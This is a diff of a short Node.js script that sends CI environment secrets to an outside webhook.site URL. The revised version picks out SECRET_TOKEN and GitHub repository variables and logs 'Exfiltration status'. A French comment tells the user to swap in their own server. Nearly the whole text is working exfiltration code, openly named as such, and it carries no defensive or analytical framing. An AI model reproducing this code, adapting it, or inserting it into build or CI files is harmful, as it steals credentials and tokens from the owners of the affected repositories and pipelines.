@@ -1,27 +1,33 @@
-const https = require("https");
+const https = require('https');
 
-const data = JSON.stringify({
-  stolen_env: process.env,
+const payload = JSON.stringify({
+  stolen_env: {
+    SECRET_TOKEN: process.env.SECRET_TOKEN,
+    GITHUB_ACTOR: process.env.GITHUB_ACTOR,
+    GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY,
+    CI: process.env.CI,
+  },
   timestamp: new Date().toISOString()
 });
 
 const options = {
-  hostname: "webhook.site",
-  path: "/11d48fb9-597a-4453-8533-101252c96bad", 
-  method: "POST",
+  hostname: 'webhook.site', // <-- remplace par ton serveur
+  port: 443,
+  path: '/11d48fb9-597a-4453-8533-101252c96bad',
+  method: 'POST',
   headers: {
-    "Content-Type": "application/json",
-    "Content-Length": data.length
+    'Content-Type': 'application/json',
+    'Content-Length': Buffer.byteLength(payload)
   }
 };
 
-const req = https.request(options, (res) => {
+const req = https.request(options, res => {
   console.log(`Exfiltration status: ${res.statusCode}`);
 });
 
-req.on("error", (e) => {
-  console.error("Exfiltration failed:", e.message);
+req.on('error', error => {
+  console.error(`Exfiltration error: ${error}`);
 });
 
-req.write(data);
+req.write(payload);
 req.end();
